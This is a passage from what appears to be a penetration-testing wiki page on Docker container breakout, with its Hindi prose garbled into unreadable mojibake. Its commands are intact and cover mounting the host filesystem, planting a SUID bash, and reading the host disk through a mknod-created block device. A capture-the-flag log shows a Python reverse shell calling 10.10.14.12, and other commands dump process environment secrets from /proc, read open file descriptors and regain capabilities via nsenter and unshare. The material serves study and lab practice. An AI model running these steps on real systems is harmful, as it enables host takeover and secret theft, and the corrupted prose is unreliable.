root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдорд╛рдЙрдВрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдПрд╕реНрдХреЗрдк

рдХрдИ рдлрд╛рдЗрд▓реЗрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдорд╛рдЙрдВрдЯ рдХреА рдЧрдИ рд╣реЛрдВ рдФрд░ рдЬреЛ **рдореВрд▓ рд╣реЛрд╕реНрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рджреЗрдВ**ред рдЗрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдпрд╣ рднреА рд╕рдВрдХреЗрдд рдХрд░ рд╕рдХрддреА рд╣реИрдВ рдХрд┐ **рд╣реЛрд╕реНрдЯ рджреНрд╡рд╛рд░рд╛ рдХреБрдЫ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдЬрдм рдХреБрдЫ рд╣реЛрддрд╛ рд╣реИ** (рдЬреЛ рдХрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ)ред\
рдЗрди рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рджреБрд░реБрдкрдпреЛрдЧ рд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

* release\_agent (рдкрд╣рд▓реЗ рд╣реА рдХрд╡рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛)
* [binfmt\_misc](sensitive-mounts.md#proc-sys-fs-binfmt\_misc)
* [core\_pattern](sensitive-mounts.md#proc-sys-kernel-core\_pattern)
* [uevent\_helper](sensitive-mounts.md#sys-kernel-uevent\_helper)
* [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕ рдкреГрд╖реНрда рдкрд░ **рдЕрдиреНрдп рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╛рдЗрд▓реЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="sensitive-mounts.md" %}
[sensitive-mounts.md](sensitive-mounts.md)
{% endcontent-ref %}

### рдордирдорд╛рдиреЗ рдорд╛рдЙрдВрдЯреНрд╕

рдХрдИ рдмрд╛рд░ рдЖрдк рдкрд╛рдПрдВрдЧреЗ рдХрд┐ **рдХрдВрдЯреЗрдирд░ рдореЗрдВ рд╣реЛрд╕реНрдЯ рд╕реЗ рдХреБрдЫ рд╡реЙрд▓реНрдпреВрдо рдорд╛рдЙрдВрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**ред рдпрджрд┐ рдЗрд╕ рд╡реЙрд▓реНрдпреВрдо рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЖрдк **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдВрдЪ/рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**: рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдкрдврд╝реЗрдВ, ssh authorized\_keys рдмрджрд▓реЗрдВтАж
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### 2 рд╢реЗрд▓реНрд╕ рдФрд░ рд╣реЛрд╕реНрдЯ рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣реБрдВрдЪ** рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣реЛрд╕реНрдЯ рдХрд╛ рдХреЛрдИ рдлреЛрд▓реНрдбрд░ рдорд╛рдЙрдВрдЯреЗрдб рд╣реИ рдФрд░ рдЖрдкрдиреЗ **рд╣реЛрд╕реНрдЯ рдкрд░ рдПрдХ рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрд╕реНрдХреЗрдк рдХрд┐рдпрд╛ рд╣реИ** рдФрд░ рдорд╛рдЙрдВрдЯреЗрдб рдлреЛрд▓реНрдбрд░ рдкрд░ рдкрдврд╝рдиреЗ рдХреА рдкрд╣реБрдВрдЪ рд╣реИред\
рдЖрдк **рдХрдВрдЯреЗрдирд░** рдХреЗ рдЕрдВрджрд░ **рдорд╛рдЙрдВрдЯреЗрдб рдлреЛрд▓реНрдбрд░** рдореЗрдВ рдПрдХ **bash suid рдлрд╛рдЗрд▓** рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ **рд╣реЛрд╕реНрдЯ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ** рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### 2 рд╢реЗрд▓реНрд╕ рдХреЗ рд╕рд╛рде рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╣реБрдВрдЪ** рд╣реИ рдФрд░ рдЖрдкрдиреЗ **рд╣реЛрд╕реНрдЯ рдкрд░ рдПрдХ рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдЪ рдирд┐рдХрд▓реЗ рд╣реИрдВ**, рддреЛ рдЖрдк рджреЛрдиреЛрдВ рд╢реЗрд▓реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдПрд╕реНрдХрд▓реЗрд╢рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ MKNOD рдХреНрд╖рдорддрд╛ рд╣реИ (рдпрд╣ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╣реИ) рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдХрд╛ рд░реВрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд░рдЦрддрд╛ рд╣реИред рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╛рдЗрд▓реЗрдВ рд╡рд┐рд╢реЗрд╖ рдлрд╛рдЗрд▓реЗрдВ рд╣реЛрддреА рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ **рдЕрдВрддрд░реНрдирд┐рд╣рд┐рдд рд╣рд╛рд░реНрдбрд╡реЗрдпрд░ рдФрд░ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓реНрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, /dev/sda рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдлрд╛рдЗрд▓ **рд╕рд┐рд╕реНрдЯрдо рдбрд┐рд╕реНрдХ рдкрд░ рдХрдЪреНрдЪреЗ рдбреЗрдЯрд╛ рдХреЛ рдкрдврд╝рдиреЗ** рдХреА рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред

Docker рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕реЗрд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ** рдЗрд╕рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдирд░ рдкрд░ рдПрдХ cgroup рдиреАрддрд┐ рд╕реЗрдЯ рдХрд░рдХреЗ рдЬреЛ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕реЗрд╕ рдХреЗ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдХреЛ рд░реЛрдХрддреА рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рдПрдХ рдмреНрд▓реЙрдХ рдбрд┐рд╡рд╛рдЗрд╕ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рдИ рдЧрдИ рд╣реИ рддреЛ рдЗрд╕реЗ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** /proc/PID/root/ рдлреЛрд▓реНрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХрд┐рд╕реА рдХреЗ рджреНрд╡рд╛рд░рд╛ **рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░**, рд╕реАрдорд╛ рдпрд╣ рд╣реИ рдХрд┐ **рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рд╡рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХреЗ рдкрд╛рд╕ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдмрд╛рд╣рд░ рдФрд░ рдЕрдВрджрд░ рджреЛрдиреЛрдВ рдЬрдЧрд╣ рдХрдВрдЯреЗрдирд░ рдореЗрдВред

**рд╢реЛрд╖рдг** рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ [**рд░рд╛рдЗрдЯрдЕрдк**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/) рд╕реЗ:
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

рдпрджрд┐ рдЖрдк рд╣реЛрд╕реНрдЯ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрди рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдмрд╣реБрдд рд╕рд╛рд░реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХреЗрдВрдЧреЗред рдЯреЗрд╕реНрдЯ рд▓реИрдм рдЪрд▓рд╛рдПрдБ:
```
docker run --rm -it --pid=host ubuntu bash
```
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк `ps auxn` рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХрдорд╛рдВрдбреНрд╕ рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдлрд┐рд░, рдЪреВрдВрдХрд┐ рдЖрдк **/proc/ рдореЗрдВ рд╣реЛрд╕реНрдЯ рдХреА рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдЙрдирдХреЗ env secrets рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдХрд░:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
рдЖрдк **рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдлрд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░реНрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдирдХреА рдЦреБрд▓реА рд╣реБрдИ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
рдЖрдк **рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдорд╛рд░рдХрд░ DoS рдХрд╛ рдХрд╛рд░рдг рднреА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

{% hint style="warning" %}
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рдмрд╛рд╣рд░ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ **рдкреНрд░рд╡реЗрд╢ рд╣реИ**, рддреЛ рдЖрдк `nsenter --target <pid> --all` рдпрд╛ `nsenter --target <pid> --mount --net --pid --cgroup` рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ **рдЙрд╕реА ns рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рд╢реЗрд▓ рдЪрд▓рд╛рдПрдВ** (рдЖрд╢рд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рдирд╣реАрдВ) **рдЬреИрд╕рд╛ рдХрд┐ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рд╣реИред**
{% endhint %}

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
рдпрджрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЛ Docker [рд╣реЛрд╕реНрдЯ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдбреНрд░рд╛рдЗрд╡рд░ (`--network=host`)](https://docs.docker.com/network/host/) рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рдЙрд╕ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдЯреИрдХ Docker рд╣реЛрд╕реНрдЯ рд╕реЗ рдЕрд▓рдЧ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ (рдХрдВрдЯреЗрдирд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЛ рд╢реЗрдпрд░ рдХрд░рддрд╛ рд╣реИ), рдФрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ рдЕрдкрдирд╛ рдЖрдИрдкреА-рдПрдбреНрд░реЗрд╕ рдЖрд╡рдВрдЯрд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рджреВрд╕рд░реЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ, **рдХрдВрдЯреЗрдирд░ рд╕рднреА рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╕реАрдзреЗ рд╣реЛрд╕реНрдЯ рдХреЗ рдЖрдИрдкреА рдкрд░ рдмрд╛рдЗрдВрдб рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХрдВрдЯреЗрдирд░ **рд╕рднреА рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд╣реЛрд╕реНрдЯ** рд╢реЗрдпрд░реНрдб рдЗрдВрдЯрд░рдлрд╝реЗрд╕ `tcpdump -i eth0` рдкрд░ рднреЗрдЬ рдФрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛрд╕реНрдЯ рдФрд░ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдХреЗ рдмреАрдЪ **рдЯреНрд░реИрдлрд╝рд┐рдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдФрд░ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ рд╕реНрдкреВрдл рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреА рддрд░рд╣:

* [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
* [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata\_MITM\_root\_EKS\_GKE/)

рдЖрдк рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ **localhost рдкрд░ рдмрд╛рдЗрдВрдб рдХреА рдЧрдИ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдУрдВ** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗ рдпрд╛ рдпрд╣рд╛рдВ рддрдХ рдХрд┐ **рдиреЛрдб рдХреЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХреЗрдВрдЧреЗ (рдЬреЛ рдХрд┐ рдПрдХ рдХрдВрдЯреЗрдирд░ рджреНрд╡рд╛рд░рд╛ рдкрд╣реБрдВрдЪреА рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╕реЗ рдЕрд▓рдЧ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ)ред

### hostIPC
```
docker run --rm -it --ipc=host ubuntu bash
```
рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреЗрд╡рд▓ `hostIPC=true` рд╣реИ, рддреЛ рдЖрдк рд╢рд╛рдпрдж рдЬреНрдпрд╛рджрд╛ рдХреБрдЫ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗред рдпрджрд┐ рд╣реЛрд╕реНрдЯ рдкрд░ рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреЙрдб рдХреА рдХреЛрдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рд╣реЛрд╕реНрдЯ рдХреЗ **рдЕрдВрддрд░-рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдЪрд╛рд░ рддрдВрддреНрд░** (рд╕рд╛рдЭрд╛ рдореЗрдореЛрд░реА, рд╕реЗрдорд╛рдлреЛрд░ рдРрд░реЗ, рдореИрд╕реЗрдЬ рдХреНрдпреВ, рдЖрджрд┐) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реА рд╣реИрдВ, рддреЛ рдЖрдк рдЙрдиреНрд╣реАрдВ рддрдВрддреНрд░реЛрдВ рдХреЛ рдкрдврд╝/рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред рдкрд╣рд▓реА рдЬрдЧрд╣ рдЬрд╣рд╛рдБ рдЖрдк рджреЗрдЦрдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ рд╡рд╣ `/dev/shm` рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ `hostIPC=true` рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдкреЙрдб рдФрд░ рд╣реЛрд╕реНрдЯ рдХреЗ рдмреАрдЪ рд╕рд╛рдЭрд╛ рдХреА рдЬрд╛рддреА рд╣реИред рдЖрдкрдХреЛ `ipcs` рдХреЗ рд╕рд╛рде рдЕрдиреНрдп IPC рддрдВрддреНрд░реЛрдВ рдХреА рднреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред

* **/dev/shm рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** - рдЗрд╕ рд╕рд╛рдЭрд╛ рдореЗрдореЛрд░реА рд╕реНрдерд╛рди рдореЗрдВ рдХрд┐рд╕реА рднреА рдлрд╛рдЗрд▓ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ: `ls -la /dev/shm`
* **рдореМрдЬреВрджрд╛ IPC рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ** - рдЖрдк рдпрд╣ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ IPC рд╕реБрд╡рд┐рдзрд╛рдПрдБ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИрдВ `/usr/bin/ipcs` рдХреЗ рд╕рд╛рдеред рдЗрд╕реЗ рдЬрд╛рдВрдЪреЗрдВ: `ipcs -a`

### рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐

рдпрджрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **`unshare`** рдкрд░ рдкреНрд░рддрд┐рдмрдВрдз рдирд╣реАрдВ рд╣реИ рддреЛ рдЖрдк рд╕рднреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд▓рд╛рдХрд░ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### рдпреВрдЬрд░ рдиреЗрдорд╕реНрдкреЗрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рд╕рд┐рдорд▓рд┐рдВрдХ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЗрд╕ рдкреЛрд╕реНрдЯ рдореЗрдВ рдмрддрд╛рдИ рдЧрдИ рджреВрд╕рд░реА рддрдХрдиреАрдХ [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) рдпрд╣ рджрд░реНрд╢рд╛рддреА рд╣реИ рдХрд┐ рдЖрдк рдпреВрдЬрд░ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдВрдб рдорд╛рдЙрдВрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХреИрд╕реЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдХреА рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдЙрд╕ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓реЗ рдореЗрдВ, рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд╣рдЯрд╛рдирд╛).

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

